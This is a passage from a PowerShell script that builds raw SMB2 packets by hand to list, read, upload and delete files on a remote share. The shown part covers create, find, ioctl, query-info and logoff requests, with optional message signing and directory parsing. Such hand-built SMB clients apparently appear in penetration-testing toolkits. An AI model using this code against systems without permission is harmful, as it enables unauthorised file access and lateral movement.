                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x01,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                            }

                        }

                        if($Action -eq 'Get')
                        {
                            $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                            $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x05,0x00,0x00,0x00
                        }

                        if($Action -eq 'Put')
                        {
                        
                            switch($action_step)
                            {

                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x60,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x01,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                }

                                1
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x64,0x00,0x00,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x97,0x01,0x13,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x00,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                    $packet_SMB2_data["FileAttributes"] = 0x20,0x00,0x00,0x00
                                    $packet_SMB2_data["CreateDisposition"] = 0x05,0x00,0x00,0x00
                                }

                            }

                        }

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                        {

                            $error_code = [System.BitConverter]::ToString($client_receive[12..15])

                            switch($error_code)
                            {

                                '03-01-00-c0'
                                {
                                    $stage = 'Exit'
                                }

                                '22-00-00-c0'
                                {

                                    if($directory_list.Count -gt 0)
                                    {
                                        $directory_list.RemoveAt(0) > $null
                                    }
                                    else
                                    {
                                        $output_message = "[-] Access denied"
                                        $share_subdirectory_start = $false
                                    }

                                    $stage = 'CloseRequest'

                                }

                                '34-00-00-c0'
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $create_request_extra_info = 3
                                        $action_step++
                                        $stage = 'CreateRequest'
                                    }
                                    else
                                    {
                                        $output_message = "[-] File not found"
                                        $stage = 'Exit'
                                    }

                                }

                                'ba-00-00-c0'
                                {
                                    
                                    if($Action -eq 'Put')
                                    {
                                        $output_message = "[-] Destination filname must be specified"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    $output_message = "[-] Create request error code 0x$error_code"
                                    $stage = 'Exit'
                                }

                            }

                        }
                        elseif($Action -eq 'Delete' -and $action_step -eq 2)
                        {
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x0d
                            $set_info_request_buffer = 0x01,0x00,0x00,0x00
                            $SMB_file_ID = $client_receive[132..147]
                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -ne 1)
                        {

                            switch($action_step)
                            {

                                0
                                {
                                    $SMB_file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'CloseRequest'
                                }

                                2
                                {

                                    if($file_size -lt 4096)
                                    {
                                        $read_request_length = $file_size
                                    }
                                    else
                                    {
                                        $read_request_length = 4096
                                    }

                                    $read_request_offset = 0
                                    $SMB_file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                                4
                                {
                                    $header_next_command = 0x68,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x01
                                    $query_info_request_file_info_class_1 = 0x07
                                    $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x68,0x00
                                    $query_info_request_buffer_1 = 0
                                    $query_info_request_info_type_2 = 0x01
                                    $query_info_request_file_info_class_2 = 0x16
                                    $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x68,0x00
                                    $query_info_request_buffer_2 = 0
                                    $SMB_file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($Action -eq 'Put')
                        {

                            switch($action_step)
                            {

                                0
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $output_message = "Destination file exists"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                1
                                {
                                    $SMB_file_ID = $client_receive[132..147]
                                    $action_step++
                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $SMB_file_ID = $client_receive[132..147]
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $SMB_file_ID = $client_receive[132..147]
                            $stage = 'CloseRequest'
                        }
                        elseif($directory_list.Count -gt 0 -or $action_step -eq 1)
                        {
                            $stage = 'FindRequest'
                        }
                        else
                        {
                            $header_next_command = 0x70,0x00,0x00,0x00
                            $query_info_request_info_type_1 = 0x02
                            $query_info_request_file_info_class_1 = 0x01
                            $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_1 = 0x00,0x00
                            $query_info_request_buffer_1 = 8
                            $query_info_request_info_type_2 = 0x02
                            $query_info_request_file_info_class_2 = 0x05
                            $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_2 = 0x00,0x00
                            $query_info_request_buffer_2 = 1
                            $SMB_file_ID = $client_receive[132..147]
                            $stage = 'QueryInfoRequest'

                            if($share_subdirectory)
                            {
                                $share_subdirectory_start = $true
                            }

                        }

                    }

                    'CreateRequestFindRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file 1
                        $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_SMB2_header["NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2b_header["NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $message_ID++
                        $packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2c_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2c_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                        $packet_SMB2c_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2c_header + $SMB2c_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2c_header["Signature"] = $SMB2_signature
                            $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $action_step++
                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'FindRequest'
                    {
                        $SMB_file_ID = $client_receive[132..147]
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = 0x68,0x00,0x00,0x00
                        $packet_SMB2_data = New-PacketSMB2FindRequestFile $SMB_file_ID 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile $SMB_file_ID
                        $packet_SMB2b_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 1)
                        {
                            $find_response = [System.BitConverter]::ToString($client_receive)
                            $find_response = $find_response -replace "-",""
                            $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))
                            $file_unicode = $file_unicode -replace "-",""
                            $file_size_index = $find_response.IndexOf($file_unicode) - 128
                            $file_size = [System.BitConverter]::ToUInt32($client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($share_subdirectory -eq $file)
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($file)
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'IoctlRequest'
                    {
                        $tree_ID = 0x01,0x00,0x00,0x00
                        $ioctl_path = "\" + $Target + "\" + $Share
                        $ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($ioctl_path) + 0x00,0x00
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest $ioctl_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $tree_ID = 0x00,0x00,0x00,0x00
                        $stage = 'TreeConnect'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'ParseDirectoryContents'
                    {
                        $subdirectory_list = New-Object System.Collections.ArrayList
                        $create_response_file = [System.BitConverter]::ToString($client_receive)
                        $create_response_file = $create_response_file -replace "-",""
                        $directory_contents_mode_list = New-Object System.Collections.ArrayList
                        $directory_contents_create_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_length_list = New-Object System.Collections.ArrayList
                        $directory_contents_name_list = New-Object System.Collections.ArrayList

                        if($directory_list.Count -gt 0)
                        {
                            $create_response_file_index = 152
                            $directory_list.RemoveAt(0) > $null
                        }
                        else
                        {
                            $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154
                        }

                        do
                        {
                            $SMB_next_offset = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)
                            $SMB_file_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)
                            $SMB_file_attributes = [Convert]::ToString($client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                            if($SMB_file_length -eq 0)
                            {
                                $SMB_file_length = $null
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {
                                $SMB_file_mode = "d"
                            }
                            else
                            {
                                $SMB_file_mode = "-"
                            }

                            if($SMB_file_attributes.Substring(10,1) -eq '1')
                            {
                                $SMB_file_mode+= "a"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(15,1) -eq '1')
                            {
                                $SMB_file_mode+= "r"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(14,1) -eq '1')
                            {
                                $SMB_file_mode+= "h"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(13,1) -eq '1')
                            {
                                $SMB_file_mode+= "s"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))
                            $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'
                            $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))
                            $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'
                            $SMB_filename_length = [System.BitConverter]::ToUInt32($client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)
                            $SMB_filename_unicode = $client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]
                            $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)
                            $SMB_filename = $SMB_filename -replace "-00",""

                            if($SMB_filename.Length -gt 2)
                            {
                                $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)
                            }
                            else
                            {
                                $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)
                            }

                            if(!$Modify)
                            {
                                $file_last_write_time = $file_last_write_time.PadLeft(19,0)
                                [String]$SMB_file_length = $SMB_file_length
                                $SMB_file_length = $SMB_file_length.PadLeft(15,0)
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {

                                if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')
                                {
                                    $subdirectory_list.Add($SMB_filename_unicode) > $null
                                    $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                    $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                    $directory_contents_length_list.Add($SMB_file_length) > $null
                                    $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                    $directory_contents_create_time_list.Add($file_create_time) > $null
                                }

                            }
                            else
                            {
                                $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                $directory_contents_length_list.Add($SMB_file_length) > $null
                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                $directory_contents_create_time_list.Add($file_create_time) > $null
                            }

                            if($share_subdirectory -and !$share_subdirectory_start)
                            {
                                $root_directory_string = $share_subdirectory + '\'
                            }

                            $SMB_offset += $SMB_next_offset
                        }
                        until($SMB_next_offset -eq 0)

                        if($directory_contents_name_list)
                        {

                            if($root_directory_string)
                            {
                                $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)
                            }
                            else
                            {
                                $file_directory = $target_share
                            }

                        }

                        $directory_contents_output = @()
                        $i = 0

                        ForEach($directory in $directory_contents_name_list)
                        {
                            $directory_object = New-Object PSObject
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                            if($Modify)
                            {
                                Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]
                            }

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]
                            $directory_contents_output += $directory_object
                            $i++
                        }

                        if($directory_contents_output -and !$Modify)
                        {

                            if($directory_contents_hide_headers)
                            {
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                            }
                            else
                            {
                                $directory_contents_hide_headers = $true
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                            @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                            @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                            @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()
                            }

                        }
                        else
                        {
                            $directory_contents_output
                        }

                        $subdirectory_list.Reverse() > $null

                        ForEach($subdirectory in $subdirectory_list)
                        {  
                            $directory_list.Insert(0,($root_directory + $subdirectory)) > $null
                        }
                        
                        $SMB_offset = 0
                        $stage = 'CloseRequest'
                    }

                    'QueryInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = $header_next_command
                        $packet_SMB2_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $SMB_file_ID $query_info_request_buffer_1
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $SMB_file_ID $query_info_request_buffer_2
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($share_subdirectory_start)
                        {
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get')
                        {

                            switch($action_step)
                            {

                                5
                                {
                                    $query_info_response = [System.BitConverter]::ToString($client_receive)
                                    $query_info_response = $query_info_response -replace "-",""
                                    $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170
                                    $file_stream_size = [System.BitConverter]::ToUInt32($client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)
                                    $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)
                                    $file_stream_size_remainder = $file_stream_size % 65536
                                    $percent_complete = $file_stream_size_quotient

                                    if($file_stream_size_remainder -ne 0)
                                    {
                                        $percent_complete++
                                    }
                                    
                                    if($file_stream_size -lt 1024)
                                    {
                                        $progress_file_size = "" + $file_stream_size + "B"
                                    }
                                    elseif($file_stream_size -lt 1024000)
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"
                                    }
                                    else
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"
                                    }

                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                                6
                                {

                                    if($file_stream_size -lt 65536)
                                    {
                                        $read_request_length = $file_stream_size
                                    }
                                    else
                                    {
                                        $read_request_length = 65536
                                    }

                                    $read_request_offset = 0
                                    $read_request_step = 1
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                            }
                        }
                        elseif($Action -eq 'Put')
                        {
                            $percent_complete = $source_file_size_quotient

                            if($source_file_size_remainder -ne 0)
                            {
                                $percent_complete++
                            }

                            if($source_file_size -lt 1024)
                            {
                                $progress_file_size = "" + $source_file_size + "B"
                            }
                            elseif($source_file_size -lt 1024000)
                            {
                                $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"
                            }
                            else
                            {
